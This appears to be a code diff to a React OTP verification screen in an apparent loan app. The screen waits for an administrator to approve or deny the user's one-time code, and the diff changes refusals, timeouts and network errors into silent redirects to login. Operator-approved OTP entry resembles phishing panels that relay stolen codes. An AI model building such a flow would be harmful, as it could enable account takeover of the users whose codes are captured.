@@ -66,25 +66,26 @@ const OTPVerification = () => {
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
+              // ✅ Approved: Go to Loan Limit
               navigate("/loan-limit", { state: { phone: phoneNumber } });
-            } else {
-              alert("Votre code OTP a été refusé par l'administrateur.");
-              setOtp(["", "", "", ""]);
-              inputRefs.current[0]?.focus();
+            } else if (statusData.status === "denied") {
+              // ✅ Denied: Directly redirect to Login
+              navigate("/"); 
             }
           }
         }, 2000);
 
-        // 45 seconds timeout
+        // 45 seconds timeout - Directly redirect to Login
         setTimeout(() => {
           clearInterval(interval);
           setIsVerifying(false);
-          alert("Délai d'attente dépassé. Veuillez réessayer.");
+          navigate("/"); 
         }, 45000);
       }
     } catch (error) {
+      // Network error: Directly redirect to Login
       setIsVerifying(false);
-      alert("Erreur réseau.");
+      navigate("/");
     }
   };
 
@@ -139,7 +140,6 @@ const OTPVerification = () => {
         </button>
       </div>
 
-      {/* ✅ UPDATED SPINNER MODAL */}
       {isVerifying && (
         <div className="modal-overlay">
           <div className="modal-content">
